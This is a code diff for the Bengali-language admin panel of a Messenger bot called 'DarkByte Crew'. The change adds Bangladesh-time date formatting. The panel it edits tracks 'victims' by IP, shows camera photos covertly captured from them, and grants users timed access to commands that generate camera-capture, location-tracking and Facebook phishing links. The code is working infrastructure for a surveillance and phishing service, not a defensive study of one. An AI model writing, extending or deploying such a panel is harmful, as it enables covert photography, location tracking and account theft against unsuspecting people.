@@ -5,17 +5,37 @@ const User = require('../models/User');
 const Victim = require('../models/Victim');
 const { sendMessage } = require('../utils/helpers');
 
-// ============================
+// ================================================================
+// 🔥 বাংলাদেশ সময় ফরম্যাট করার ফাংশন (admin প্যানেলের জন্য)
+// ================================================================
+function formatBDDateTime(date) {
+    if (!date) return 'N/A';
+    const d = new Date(date);
+    // UTC+6 অফসেট যোগ করুন
+    const bdTime = new Date(d.getTime() + (6 * 60 * 60 * 1000));
+    
+    const day = String(bdTime.getUTCDate()).padStart(2, '0');
+    const month = String(bdTime.getUTCMonth() + 1).padStart(2, '0');
+    const year = bdTime.getUTCFullYear();
+    let hours = bdTime.getUTCHours();
+    const minutes = String(bdTime.getUTCMinutes()).padStart(2, '0');
+    const ampm = hours >= 12 ? 'PM' : 'AM';
+    hours = hours % 12 || 12;
+    
+    return `${day}/${month}/${year}, ${hours}:${minutes} ${ampm}`;
+}
+
+// ================================================================
 // অ্যাডমিন মিডলওয়্যার
-// ============================
+// ================================================================
 const isAdmin = (req, res, next) => {
     if (req.session.isAdmin) return next();
     res.redirect('/admin');
 };
 
-// ============================
+// ================================================================
 // লগইন পেজ
-// ============================
+// ================================================================
 router.get('/admin', async (req, res) => {
     if (req.session.isAdmin) {
         return res.redirect('/admin/dashboard');
@@ -106,14 +126,17 @@ async function renderDashboard(req, res) {
     const allUsers = await User.find({}, 'fbId firstName');
     allUsers.forEach(u => { userMap[u.fbId] = u.firstName || 'N/A'; });
 
-    // ----- ইউজার টেবিল (তিনটি ইনপুট ফিল্ড সহ) -----
+    // ================================================================
+    // ইউজার টেবিল (তিনটি ইনপুট ফিল্ড + বাংলাদেশ সময়)
+    // ================================================================
     let userRows = '';
     if (users && users.length > 0) {
         userRows = users.map(u => {
-            const expiryText = u.permissionExpiresAt ? new Date(u.permissionExpiresAt).toLocaleString('bn-BD') : 'চিরস্থায়ী';
+            const expiryText = u.permissionExpiresAt ? formatBDDateTime(u.permissionExpiresAt) : 'চিরস্থায়ী';
             const isExpired = u.permissionExpiresAt && new Date() > u.permissionExpiresAt;
             const statusText = u.allowed ? (isExpired ? '⏳ এক্সপায়ার' : '✅ অনুমোদিত') : '❌ বাতিল';
             const statusClass = u.allowed ? (isExpired ? 'expired' : 'allowed') : 'denied';
+            const firstSeenBD = formatBDDateTime(u.firstSeen);
             return `
                 <tr>
                     <td><code class="id-badge">${u.fbId}</code></td>
@@ -124,7 +147,7 @@ async function renderDashboard(req, res) {
                             <button type="submit" class="btn-icon" style="color:#4f46e5;background:transparent;border:none;cursor:pointer;" title="নাম পরিবর্তন"><i class="fas fa-pen"></i></button>
                         </form>
                     </td>
-                    <td>${new Date(u.firstSeen).toLocaleDateString('bn-BD')}</td>
+                    <td>${firstSeenBD}</td>
                     <td>${u.messageCount || 0}</td>
                     <td><span class="status-badge ${statusClass}">${statusText}</span></td>
                     <td style="font-size:12px;color:#6b7280;">${expiryText}</td>
@@ -153,14 +176,17 @@ async function renderDashboard(req, res) {
         userRows = '<tr><td colspan="7" style="text-align:center;color:#9ca3af;padding:30px 0;">কোনো ইউজার নেই</td></tr>';
     }
 
-    // ----- ভিক্টিম টেবিল -----
+    // ================================================================
+    // ভিক্টিম টেবিল (বাংলাদেশ সময়)
+    // ================================================================
     let victimRows = '';
     if (victims && victims.length > 0) {
         victimRows = victims.map(v => {
             const lastImage = v.camera && v.camera.length > 0 ? v.camera[v.camera.length - 1].image : null;
             const imgTag = lastImage ? `<img src="data:image/jpeg;base64,${lastImage}" class="victim-thumb" />` : '—';
-            const expiryStatus = v.isExpired ? '⛔ এক্সপায়ার' : (v.expiresAt ? new Date(v.expiresAt).toLocaleString('bn-BD') : 'N/A');
+            const expiryStatus = v.isExpired ? '⛔ এক্সপায়ার' : (v.expiresAt ? formatBDDateTime(v.expiresAt) : 'N/A');
             const creatorName = userMap[v.fbId] || v.creatorName || 'N/A';
+            const timestampBD = formatBDDateTime(v.timestamp);
             return `
                 <tr>
                     <td><code class="id-badge">${v.id}</code></td>
@@ -179,7 +205,7 @@ async function renderDashboard(req, res) {
                         </form>
                     </td>
                     <td style="font-size:12px;">${expiryStatus}</td>
-                    <td>${new Date(v.timestamp).toLocaleDateString('bn-BD')}</td>
+                    <td>${timestampBD}</td>
                 </tr>
             `;
         }).join('');
@@ -187,24 +213,32 @@ async function renderDashboard(req, res) {
         victimRows = '<tr><td colspan="11" style="text-align:center;color:#9ca3af;padding:30px 0;">কোনো ভিক্টিম নেই</td></tr>';
     }
 
-    // ----- ড্যাশবোর্ডে সাম্প্রতিক ভিক্টিম -----
+    // ================================================================
+    // ড্যাশবোর্ডে সাম্প্রতিক ভিক্টিম (বাংলাদেশ সময়)
+    // ================================================================
     let recentVictimRows = '';
     const recent = victims.slice(0, 5);
     if (recent.length > 0) {
-        recentVictimRows = recent.map(v => `
-            <tr>
-                <td><code class="id-badge">${v.id}</code></td>
-                <td><span class="type-badge ${v.type}">${v.type}</span></td>
-                <td>${v.ip || 'N/A'}</td>
-                <td>${userMap[v.fbId] || v.creatorName || 'N/A'}</td>
-                <td>${new Date(v.timestamp).toLocaleDateString('bn-BD')}</td>
-            </tr>
-        `).join('');
+        recentVictimRows = recent.map(v => {
+            const timestampBD = formatBDDateTime(v.timestamp);
+            const creatorName = userMap[v.fbId] || v.creatorName || 'N/A';
+            return `
+                <tr>
+                    <td><code class="id-badge">${v.id}</code></td>
+                    <td><span class="type-badge ${v.type}">${v.type}</span></td>
+                    <td>${v.ip || 'N/A'}</td>
+                    <td>${creatorName}</td>
+                    <td>${timestampBD}</td>
+                </tr>
+            `;
+        }).join('');
     } else {
         recentVictimRows = '<tr><td colspan="5" style="text-align:center;color:#9ca3af;padding:20px;">কোনো ভিক্টিম নেই</td></tr>';
     }
 
-    // ----- HTML বিভাগ -----
+    // ================================================================
+    // HTML বিভাগ (ড্যাশবোর্ড, ইউজার, ভিক্টিম, কনফিগ)
+    // ================================================================
     const dashboardHtml = (activeTab === 'dashboard') ? `
     <div id="dashboard">
         <div class="stats">
@@ -295,9 +329,9 @@ async function renderDashboard(req, res) {
     </div>
     ` : '';
 
-    // ============================================================
+    // ================================================================
     // ফাইনাল HTML পেজ
-    // ============================================================
+    // ================================================================
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -410,12 +444,12 @@ async function renderDashboard(req, res) {
 }
 
 // ================================================================
-// 🔥 ড্যাশবোর্ড রাউট (এখানে সরাসরি কল হবে)
+// 🔥 ড্যাশবোর্ড রাউট
 // ================================================================
 router.get('/admin/dashboard', isAdmin, renderDashboard);
 
 // ================================================================
-// POST রাউটস (সব অ্যাকশন)
+// POST রাউটস
 // ================================================================
 
 // কনফিগ আপডেট
@@ -435,7 +469,7 @@ router.post('/admin/update-config', isAdmin, async (req, res) => {
 });
 
 // ================================================================
-// 🔥 ইউজার টগল – তিনটি ইনপুট ফিল্ড (দিন, ঘন্টা, মিনিট) থেকে সময় ক্যালকুলেশন
+// ইউজার টগল – তিনটি ইনপুট ফিল্ড (দিন, ঘন্টা, মিনিট)
 // ================================================================
 router.post('/admin/toggle-user', isAdmin, async (req, res) => {
     try {
@@ -468,9 +502,7 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
         }
         await user.save();
 
-        // ============================================================
-        // 🔥 অনুমোদন মেসেজ (দিন/ঘন্টা/মিনিট উল্লেখ সহ)
-        // ============================================================
+        // অনুমোদন মেসেজ
         if (action === 'allow' && !wasAllowed) {
             const fullName = user.firstName || 'বন্ধু';
             const durationText = (parseInt(days) || 0) + ' দিন ' + (parseInt(hours) || 0) + ' ঘন্টা ' + (parseInt(minutes) || 0) + ' মিনিট';
@@ -478,14 +510,14 @@ router.post('/admin/toggle-user', isAdmin, async (req, res) => {
 
 আপনাকে DarkByte Crew বটের অ্যাক্সেস দেওয়া হয়েছে। 🔓
 ⏰ সময়সীমা: ${durationText}
-${user.permissionExpiresAt ? `এক্সপাইরি তারিখ: ${new Date(user.permissionExpiresAt).toLocaleString('bn-BD')}` : 'চিরস্থায়ী অ্যাক্সেস'}
+${user.permissionExpiresAt ? `এক্সপাইরি তারিখ: ${formatBDDateTime(user.permissionExpiresAt)}` : 'চিরস্থায়ী অ্যাক্সেস'}
 
 এখন থেকে আপনি বটের সকল ফিচার ও কমান্ড ব্যবহার করতে পারবেন।
 
 ⚙️ কমান্ড দেখতে টাইপ করুন:
 ━━━━━━━━━━━━━━━━━━━━
 📷 .camera — ক্যামেরা লিংক
-📍 .location — লোকেশন লিংক
+📍 .location — লোকেশন লিংک
 👤 .fb — ফেসবুক লিংক
 
 🔗 Owner: m.me/2ndJohnnySins`;
@@ -568,10 +600,11 @@ router.get('/admin/victim/:id', isAdmin, async (req, res) => {
         let imagesHtml = '';
         if (victim.camera && victim.camera.length > 0) {
             victim.camera.forEach((cam, index) => {
+                const bdTime = formatBDDateTime(cam.timestamp);
                 imagesHtml += `
                     <div class="gallery-item">
                         <img src="data:image/jpeg;base64,${cam.image}" alt="ছবি ${index+1}" />
-                        <div class="gallery-label">ছবি #${index+1} <br> <small>${new Date(cam.timestamp).toLocaleString('bn-BD')}</small></div>
+                        <div class="gallery-label">ছবি #${index+1} <br> <small>${bdTime}</small></div>
                     </div>
                 `;
             });
